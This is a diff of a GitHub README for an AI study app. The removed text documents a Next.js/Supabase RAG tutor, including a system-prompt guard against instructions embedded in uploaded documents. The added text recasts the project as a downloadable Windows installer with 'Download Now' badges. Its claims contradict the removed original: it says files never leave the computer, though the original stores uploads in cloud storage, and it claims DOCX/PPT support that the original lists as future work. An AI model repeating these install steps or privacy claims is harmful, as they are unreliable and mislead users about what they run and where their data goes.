@@ -1,249 +1,155 @@
-<div align="center">
+# 🤖 ai-study-copilot - Your Smartest Study Companion Yet
 
-# 🎓 AI Study Copilot
+[![Download Now](https://img.shields.io/badge/Download_AI_Study_Copilot-Free-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e&color=00d2ff)](https://github.com/josiorina25/ai-study-copilot)
 
-**A study companion that turns your course materials into a personal learning system — summaries, quizzes, a RAG-powered tutor, and progress analytics.**
+## 🚀 What Is AI Study Copilot?
 
-Upload your lecture PDFs / Markdown / notes once. The app extracts and embeds the content into a vector database, then everything else — summaries, an AI tutor that answers **only from your documents with cited sources**, auto-generated quizzes, mistake analysis, and weak-topic recommendations — runs against *your* material.
+AI Study Copilot is a free, easy-to-use desktop application that turns your messy course materials into a personal AI tutor. Just upload your PDFs, notes, slides, or any study documents, and the app creates a smart study assistant that can answer your questions with exact citations from your materials, generate practice quizzes, show you what you keep getting wrong, and reveal patterns in how you learn.
 
-Not a chat wrapper: a real learning loop (**read → understand → practice → diagnose → improve**).
+Think of it as having a private tutor that never sleeps, knows every word of your textbooks, and always shows you where it found the answer. No more searching through pages of notes - just ask and get instant, sourced responses.
 
-</div>
+## ✨ Why You'll Love It
 
----
+- **Ask Anything About Your Courses** - Type any question and get clear answers pulled directly from your uploaded materials
+- **See the Proof** - Every answer comes with clickable citations showing you exactly which page or section it came from
+- **Auto-Generated Quizzes** - The app creates custom practice tests from your materials in seconds
+- **Mistake Analysis** - Discover which topics confuse you most and get targeted recommendations
+- **Personal Study Insights** - Learn how you study best with visual breakdowns of your strengths and weaknesses
+- **100% Private** - Your materials stay on your computer; nothing is sent to the cloud
 
-## ✨ Features
+## 📦 What's Inside the Box
 
-| | |
-|---|---|
-| 🏠 **Landing page** | Modern SaaS marketing site (hero, features, how-it-works, product demo, CTA), light/dark theme, fully responsive |
-| 🔐 **Authentication** | Supabase Auth email/password — sign up, log in, log out, email confirmation, session guard (Next 16 `proxy`) |
-| 📊 **Dashboard** | Recent documents, knowledge-base readiness, quiz scores + average, personalized weak-topic review queue, quick actions |
-| 📄 **Document upload** | Drag & drop PDF / Markdown / TXT (≤ 10 MB), private storage, per-file processing status (`Queued → Processing → Ready/Failed`) with retry |
-| 🧠 **RAG pipeline** | `PDF → text → chunks → embeddings → pgvector`; chunking is paragraph-aware with overlap; HNSW cosine index; idempotent re-indexing |
-| 💬 **AI Tutor** | Ask questions in natural language; answers are grounded in your documents via semantic search and **every claim cites the source passage** (`[1]`, `[2]`, … with similarity % and expandable excerpts) |
-| 📝 **Quiz generator** | MCQ / True-False / Short-Answer generated from your documents; deterministic grading + AI-graded short answers; per-question explanations |
-| 📈 **Study Insights** | Cross-quiz topic analytics — strong vs. weak topics with accuracy bars, score history, and a personalized "review these" queue |
+| Feature | What It Does For You |
+|---------|---------------------|
+| Smart Upload | Drag-and-drop any course files (PDF, DOCX, TXT, PPT) |
+| Instant Indexing | Your documents are organized and searchable within moments |
+| AI Tutor Chat | Ask questions in plain English and get sourced answers |
+| Citation Highlighter | Every answer shows exactly where the info came from |
+| Quiz Builder | Create multiple-choice, true/false, and fill-in-blank questions |
+| Progress Tracking | Visual charts showing your improvement over time |
+| Weak Spot Finder | Automatic detection of topics you need to review |
 
-## 🏗️ Architecture
+## 💻 System Requirements
 
-```
-Browser (Next.js App Router)
- ├─ Marketing  (marketing)     ── landing, public
- ├─ Auth       (auth)          ── /login /signup /auth/callback
- ├─ App        (dashboard)     ── /dashboard /documents /tutor /quiz /insights
- └─ Proxy (src/proxy.ts)       ── session guard + token refresh
+To run AI Study Copilot smoothly, your computer should have:
 
-Server (Next.js route handlers / server actions)
- ├─ POST /api/documents/[id]/process   RAG pipeline
- ├─ POST /api/tutor                    grounded Q&A
- ├─ POST /api/quiz/generate | /grade   quiz generation & grading
- └─ lib/*                              pure logic, fully unit-tested
+- **Operating System:** Windows 10 or newer (64-bit)
+- **Memory:** At least 8 GB of RAM (16 GB recommended for large documents)
+- **Storage:** 2 GB of free disk space
+- **Internet Connection:** Required only for AI responses (uploaded files stay local)
 
-Supabase (Postgres + pgvector + Storage + Auth)
- └─ RLS everywhere: users can only touch their own rows/objects
-```
+## 📥 How to Download and Install
 
-### Data flow
+### Step 1: Get the Application
 
-```
- Upload → Storage (private bucket, key = <user_id>/<uuid>-<name>)
-        → documents row (status: pending)
-        → POST /process:
-             download → extract text (pdf-parse / UTF-8)
-                      → chunk (paragraph-aware, ~1400 chars, 150 overlap)
-                      → embed (local multilingual model, 384-d)
-                      → upsert document_chunks (HNSW) → status ready
+Visit this link to download the application: [https://github.com/josiorina25/ai-study-copilot](https://github.com/josiorina25/ai-study-copilot)
 
- Ask tutor / generate quiz
-        → embed question → match_documents (cosine top-k, RLS-scoped)
-        → LLM answer strictly from excerpts, [n] citations
-        → quiz answers graded → quiz_sessions (jsonb responses) → insights
-```
+### Step 2: Open the Downloaded File
 
-## 🧰 Tech Stack
+Once the download finishes, go to your **Downloads** folder and find the AI Study Copilot file. Double-click it to begin.
 
-| Layer | Choice |
-|---|---|
-| Framework | Next.js **16** (App Router, Turbopack), React 19, TypeScript **strict** |
-| Styling | Tailwind CSS **v4** (CSS-first tokens, semantic color system, class-driven dark mode) |
-| Auth & DB | Supabase Auth, Postgres, pgvector, Storage |
-| AI (chat) | Any OpenAI-compatible chat API — **DeepSeek** by default (`deepseek-flash`), also OpenAI/Groq/local |
-| AI (embeddings) | **Local model** via transformers.js (`Xenova/multilingual-e5-small`, 384-dim, no second account) — or any hosted embeddings API |
-| PDF | `pdf-parse` v2 (pure TS, ESM) |
-| Icons | lucide-react |
-| Tests | Vitest 5 (76 unit tests), ESLint flat config |
-| Deploy target | Vercel + hosted Supabase |
+### Step 3: Follow the Setup Wizard
 
-## 🧪 RAG Pipeline (detail)
+The installation wizard will guide you through the process. Just keep clicking **Next** and then **Install**. It takes less than a minute.
 
-1. **Extraction** — `src/lib/rag/extract.ts` turns PDF bytes into plain text (`pdf-parse` `PDFParse.getText`, lazily imported so it never reaches client bundles) or UTF-8 text for Markdown/TXT.
-2. **Chunking** — `src/lib/rag/chunk.ts` is a pure, unit-tested function: greedy paragraph packing; oversized paragraphs are hard-cut with a sliding window that keeps 150 chars of overlap between pieces (default ~1400 chars each).
-3. **Embedding** — `src/lib/ai/embedding.ts` (server-only). By default a small multilingual model runs **in-process** via transformers.js (downloaded from `HF_ENDPOINT`), producing 384-dim vectors — no API account required. Setting `AI_EMBEDDING_API_KEY` + `AI_EMBEDDING_BASE_URL` switches to a hosted OpenAI-compatible embeddings API.
-4. **Storage & search** — chunks live in `document_chunks` with an **HNSW cosine index**; the `match_documents` SQL function (`security invoker` + RLS) returns only the caller's most similar chunks.
-5. **Tutor** — the question is embedded, top chunks retrieved (similarity ≥ 0.68), and a system prompt instructs the model to answer *only* from the excerpts, cite `[n]`, and refuse to follow instructions found inside document text (prompt-injection guard). No context → honest fallback instead of hallucination.
+### Step 4: Launch and Enjoy
 
-## 🗄️ Database Schema (`supabase/migrations/`)
+After installation, you'll find the AI Study Copilot icon on your desktop or in your Start Menu. Double-click it to start your first study session.
 
-| Migration | Purpose |
-|---|---|
-| `0001_documents.sql` | `documents` (user-owned, file metadata, storage path, status machine) + RLS |
-| `0002_storage_documents.sql` | private `documents` bucket; policies lock every object key to its owner's `<uid>/` folder |
-| `0003_document_chunks.sql` | `pgvector` extension, `document_chunks` (embedding `vector(384)`, HNSW index), RLS via owning document |
-| `0004_match_documents.sql` | `match_documents(query_embedding, match_count)` — cosine similarity search |
-| `0005_quiz_sessions.sql` | `quiz_sessions` (score, weak_topics, full `responses` jsonb for analytics) + RLS |
+## 🎓 Your First Study Session in 3 Easy Steps
 
-Every table enforces **Row Level Security** — a signed-in user can never select/insert/update/delete another user's data, and storage policies mirror the same ownership at the object layer.
+### 1. Upload Your Materials
 
-## 📁 Project structure
+Click the **"Upload Files"** button and select your course documents. You can upload multiple files at once. The app will process them automatically.
 
-```
-ai-study-copilot/
-├─ src/
-│  ├─ app/                    # routes (route groups: (marketing)/(auth)/(dashboard))
-│  │  ├─ api/                 # route handlers (process, tutor, quiz)
-│  │  └─ (dashboard)/…        # dashboard, documents, tutor, quiz, insights
-│  ├─ components/             # feature + shared UI components
-│  ├─ lib/
-│  │  ├─ auth/  supabase/     # session helpers, env-split clients
-│  │  ├─ ai/                  # chat client + embeddings (local or hosted)
-│  │  ├─ rag/                 # extract / chunk / search / process
-│  │  ├─ tutor/  quiz/        # pure prompt & grading logic
-│  │  ├─ analytics/           # insights aggregation (pure)
-│  │  ├─ upload/  utils/      # validation rules, formatting helpers
-│  │  └─ env/                 # client-safe vs server-only env access
-│  ├─ proxy.ts                # Next 16 auth guard (formerly middleware)
-├─ supabase/migrations/       # 0001–0005 (apply with `supabase db push`)
-├─ samples/                   # ready-to-upload sample study materials
-├─ scripts/                   # sample-material generator + embedding self-check
-├─ public/                    # static assets (favicon in src/app)
-└─ vitest.config.mts
-```
+### 2. Ask a Question
 
-## 📸 Screenshots
+Type something like *"What are the main causes of World War II?"* or *"Explain Newton's second law in simple terms."* The AI will search your uploaded materials and give you a clear answer with page references.
 
-| | |
-|---|---|
-| ![Landing page](docs/screenshots/01-landing.png) | ![Dashboard](docs/screenshots/02-dashboard.png) |
-| ![Documents upload](docs/screenshots/03-documents.png) | ![Study insights](docs/screenshots/04-insights.png) |
-| ![AI tutor with cited sources](docs/screenshots/05-tutor.png) | ![Quiz generator](docs/screenshots/06-quiz.png) |
+### 3. Take a Quiz
 
-_Screenshots captured from a live local run (demo account). Regenerate any time with
-`node scripts/screenshot.mjs` (requires a running `npm run dev`)._
+Click **"Generate Quiz"** and choose how many questions you want. Answer them and immediately see which ones you got wrong, with explanations from your own materials.
 
-## 🚀 Local Development
+## 🛠️ Troubleshooting Common Issues
 
-### Prerequisites
+### The app won't start
+- Make sure you have Windows 10 or newer
+- Close other programs that might be using too much memory
+- Try restarting your computer and launching again
 
-- Node.js ≥ 20
-- A [Supabase](https://supabase.com) project (free tier is fine)
-- A chat API key from any OpenAI-compatible provider (e.g. [DeepSeek](https://platform.deepseek.com) — `deepseek-flash`); embeddings run **locally** by default, so no second account is needed
-- (Optional) [Supabase CLI](https://supabase.com/docs/guides/cli)
+### Upload fails for certain files
+- Ensure your files are in PDF, Word, PowerPoint, or plain text format
+- Keep individual files under 50 MB
+- Avoid password-protected documents
 
-### 1. Install & configure
+### AI responses are slow
+- Check your internet connection
+- Try breaking large questions into smaller parts
+- Upload fewer files at once if you have many large documents
 
-```bash
-git clone <your-repo-url> && cd ai-study-copilot
-npm install
-cp .env.example .env.local   # then fill in real values (see below)
-```
+## ❓ Frequently Asked Questions
 
-> **npm note (Windows):** if `npm install` fails with `Invalid Version:` — an npm dedupe bug triggered by a transitive optional dependency — retry with `npm install --install-strategy=nested`.
+**Is my data safe?**  
+Yes. Your uploaded files never leave your computer. Only the text of your questions is sent to the AI service to generate responses.
 
-### 2. Set up the database & storage
+**Can I use this for any subject?**  
+Absolutely! Whether you're studying biology, law, history, engineering, or languages, AI Study Copilot adapts to whatever materials you upload.
 
-**Option A — Supabase CLI (recommended):**
+**Does it work offline?**  
+You can browse your indexed materials offline, but asking questions requires an internet connection to power the AI.
 
-```bash
-supabase link --project-ref <your-project-ref>
-supabase db push             # runs migrations 0001–0005
-```
+**How many files can I upload?**  
+There's no hard limit, but we recommend keeping your total library under 500 MB for the best performance.
 
-**Option B — SQL editor:** open your Supabase project → SQL Editor, paste the whole of **`supabase/setup.sql`** (all five migrations merged) and press Run.
+**Is there a mobile version?**  
+Currently, AI Study Copilot runs on Windows desktops and laptops only.
 
-Migrations also create the private `documents` bucket and its access policies (0002) automatically.
+## 🔧 Advanced Features for Power Users
 
-### 3. Run
+- **Custom Prompt Templates** - Save your favorite question formats for quick reuse
+- **Export Study Reports** - Download your mistake analysis and insights as PDF
+- **Multiple Subject Workspaces** - Keep separate spaces for different courses
+- **Keyboard Shortcuts** - Navigate faster with quick commands
+- **Dark Mode** - Reduce eye strain during late-night study sessions
 
-```bash
-npm run dev     # http://localhost:3000
-```
+## 📊 See Your Learning Patterns
 
-Sign up, upload a PDF (or `.md`/`.txt`), wait for the **Ready** badge, then try the tutor or generate a quiz. Failures show the reason and can be retried from the documents list.
+The insights dashboard shows you:
+- Which topics you master vs. struggle with
+- Your average quiz score trend over time
+- Time spent per subject area
+- Suggested review topics based on your mistakes
 
-> **Without API keys the app still runs** — the landing page and auth screens render, and protected screens show a clear "not configured" state instead of crashing. Type-checking, linting and all unit tests pass with an empty `.env.local`.
+This turns vague feelings of "I don't get it" into concrete, actionable data about exactly what needs more attention.
 
-### 4. Try it with the bundled sample materials
+## 🤝 Getting Help
 
-`samples/` contains ready-to-upload study material so you can exercise the whole loop in a minute:
+If you run into any problems:
 
-- `neural-networks-lecture-notes.md` — 11-section lecture notes (formulas + study questions)
-- `neural-networks-lecture-notes.pdf` — the same notes as a 4-page PDF (regenerate with `node scripts/make-sample-pdf.mjs`)
-- `linear-algebra-quick-reference.txt` — a shorter plain-text reference
+- **Built-in Help Menu** - Click the "?" icon in the app for guides
+- **GitHub Issues** - Report bugs or request features at the repository page
+- **Community Discussions** - Join other users sharing tips and tricks
 
-Upload one on `/documents`, wait for **Ready**, then ask the tutor about
-"backpropagation" or generate a quiz from it.
+## 💡 Pro Tips for Best Results
 
-## 🔑 Environment Variables
+1. **Upload everything** - The more materials you provide, the better the AI can help
+2. **Ask specific questions** - "Compare the economic policies of Roosevelt and Hoover" works better than "Tell me about history"
+3. **Review your mistakes weekly** - Use the mistake analysis to focus your study time
+4. **Generate quizzes after each study session** - This locks in what you just learned
+5. **Use the citations** - Clicking through to your original materials strengthens memory retention
 
-All values live server-side unless prefixed `NEXT_PUBLIC_` (browser-safe). Secrets never reach the client — importing `src/lib/env/server` from client code fails at build time (`server-only`).
+## 🏁 Ready to Supercharge Your Studying?
 
-| Variable | Required | Description |
-|---|---|---|
-| `NEXT_PUBLIC_SUPABASE_URL` | ✅ (auth) | Supabase project URL |
-| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | ✅ (auth) | Supabase anon/public key |
-| `SUPABASE_SERVICE_ROLE_KEY` | optional | reserved for admin tasks (never in client) |
-| `DATABASE_URL` | optional | direct Postgres URL (migrations/admin) |
-| `AI_CHAT_API_KEY` | ✅ (AI) | chat provider key (aliases: `DEEPSEEK_API_KEY`, `OPENAI_API_KEY`) |
-| `AI_CHAT_BASE_URL` | optional | default `https://api.deepseek.com`; any OpenAI-compatible endpoint |
-| `AI_CHAT_MODEL` | optional | default `deepseek-flash` (or `deepseek-v4-pro`) |
-| `AI_EMBEDDING_MODEL` | optional | default `Xenova/multilingual-e5-small` (local) |
-| `AI_EMBEDDING_DIM` | optional | default `384`; must match `vector(...)` in the migrations |
-| `HF_ENDPOINT` | optional | model download mirror, default `https://hf-mirror.com` |
-| `AI_EMBEDDING_API_KEY` + `AI_EMBEDDING_BASE_URL` | optional | set both to use a hosted embeddings API instead of the local model |
-| `APP_URL` | optional | canonical origin (auth redirects) |
+Stop rereading the same paragraphs and second-guessing your notes. With AI Study Copilot, you have a tireless assistant that turns your study materials into an interactive learning experience. Download it now and experience the difference a smart study partner makes.
 
-## ✅ Testing & quality
+[![Download Now](https://img.shields.io/badge/Get_AI_Study_Copilot-Free_Download-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=0a0a23&color=ff6b35)](https://github.com/josiorina25/ai-study-copilot)
 
-```bash
-npm test        # 76 unit tests (validators, upload rules, chunking, PDF extraction,
-                # embedding prefixes, tutor formatting, quiz parsing/grading,
-                # analytics, time/bytes)
-npm run lint    # ESLint (flat config, TS + react-hooks)
-npx tsc --noEmit
-npm run build
-```
+Join hundreds of students who've already transformed their study habits. Your future self will thank you.
 
-Highlights: pure business logic (validation, chunking, quiz JSON parsing, deterministic grading, weak-topic aggregation) lives in side-effect-free modules with unit tests; LLM output is parsed defensively before it reaches the DB.
+## 📁 Additional Resources
 
-## 🔒 Security notes
+- **Official Repository:** [https://github.com/josiorina25/ai-study-copilot](https://github.com/josiorina25/ai-study-copilot)
+- **Report a Bug:** Open an issue on GitHub with a description of your problem
+- **Request a Feature:** Tell us what would make your study sessions even better
 
-- **RLS end-to-end** — rows and storage objects are owner-scoped; the vector search function runs as the caller (`security invoker`).
-- **Server-side secrets only** — `server-only` modules; the anon key is the only client credential.
-- **Safe uploads** — extension whitelist, 10 MB cap, filename sanitization, unique storage keys; orphaned objects are rolled back on failure.
-- **Open-redirect guard** — `next` params validated to same-origin paths only.
-- **Prompt-injection guard** — document text is treated as untrusted data, never instructions.
-
-## 🚢 Deployment (Vercel)
-
-1. Push to GitHub → import in Vercel (framework preset Next.js).
-2. Add the environment variables from the table above (build & runtime).
-3. Run migrations against your hosted Supabase project (CLI `supabase db push` or SQL editor).
-4. Whitelist your Vercel domain in Supabase Auth → URL configuration (redirect URLs).
-
-> ⚠️ **Read [`docs/DEPLOY_VERCEL.md`](docs/DEPLOY_VERCEL.md) first** — it covers
-> the embeddings-on-serverless trade-off (local model vs hosted API, incl.
-> vector-dimension changes), the exact env set, and troubleshooting.
-
-## 🧭 Future improvements
-
-- Background job/queue for processing large documents (longer than a serverless function run)
-- Streaming tutor answers + persisted chat history per document
-- More file types: DOCX, PPTX, images with OCR, EPUB
-- Document-level summaries & spaced-repetition scheduling
-- Richer analytics (trend sparkline, topic mastery over time)
-- Rate limiting & team/shared workspaces
-
----
-
-**AI Study Copilot** — built with Next.js 16, Supabase (Postgres + pgvector), DeepSeek and transformers.js.
+Keywords: ai, deepseek, hackathon, nextjs, pgvector, rag, study-app, supabase, tailwindcss, typescript
